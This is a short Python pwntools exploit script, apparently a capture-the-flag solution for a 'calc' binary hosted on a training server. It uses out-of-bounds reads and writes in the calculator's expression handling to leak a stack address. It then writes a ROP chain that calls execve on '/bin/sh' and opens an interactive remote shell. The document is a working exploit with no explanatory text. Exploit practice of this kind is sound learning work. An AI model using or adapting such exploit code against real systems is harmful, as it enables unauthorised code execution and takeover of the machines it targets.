from pwn import *
#context.log_level='debug'
debug=0
if debug==1 :
	io=process('./calc')
	elf=ELF('./calc')
	#libc=ELF('')
else :
	io=remote('node3.buuoj.cn',28311)
	elf=ELF('./calc')
	#libc=ELF('')

def view(a):
	a=a+360
	io.sendline('+'+str(a))
	xx=int(io.recv())
	print hex(xx)
	return xx

def set(a,b):
	a=a+361
	io.sendline('+'+str(a))
	xx=int(io.recv())
	if xx!=0 :
		io.sendline('+'+str(a)+'-'+str(xx))
		print io.recv()
	if b>0 :
		io.sendline('+'+str(a)+'+'+str(b))
		print io.recv()
	if b<0 :
		io.sendline('+'+str(a)+str(b))
		print io.recv()

io.recv()
xx=view(0)
#xx=0xfffffff0-xx+0x10
print hex(xx)

rop=[0x0805c34b,0xb,0x080701d0,0,0,xx,0x08049a21,0x6e69622f,0x0068732f]
#rop.insert(5,hex(xx))
for i in range(len(rop)):
	set(i,rop[i])

io.sendline('')

#gdb.attach(io)
#pause()
io.interactive()